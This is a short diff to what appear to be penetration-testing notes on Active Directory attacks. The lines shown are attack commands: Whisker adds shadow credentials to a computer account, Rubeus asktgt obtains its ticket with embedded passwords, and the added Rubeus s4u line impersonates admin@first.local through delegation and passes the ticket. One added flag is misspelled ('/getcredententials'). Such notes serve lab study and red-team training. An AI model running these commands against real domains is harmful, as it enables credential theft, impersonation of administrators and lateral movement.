@@ -291,8 +291,12 @@ we have write right over `ZPH-SVRMGMT1$` computer
 .\Whisker.exe list /target:ZPH-SVRMGMT1$
 .\Whisker.exe add /target:ZPH-SVRMGMT1$
 
-# Whisker will output similar output for Rubeus
+# Whisker will output similar output for Rubeus, to get computer account 
 Rubeus.exe asktgt /user:ZPH-SVRMGMT1$ /certificate:<cert> /password:"2hI2TIOeZevndEXG" /domain:zsm.local /dc:ZPH-SVRDC01.zsm.local /getcredentials /show
+
+# if this machine have delgation rights u can do or do this to impersonate users on that computer: 
+Rubeus.exe asktgt /user:user-server2$ /certificate:<cert> /password:"ckXTY5LJOKKbG2TN" /domain:first.local /dc:First-DC.first.local /getcredententials /show /ptt /nowrap
+Rubeus.exe s4u /dc:first-dc.first.local /ticket:<ticket> /impersonateuser:admin@first.local /ptt /self /service:host/user-server2.first.local /altservice:cifs/user-server2.first.local
 
 ```
 
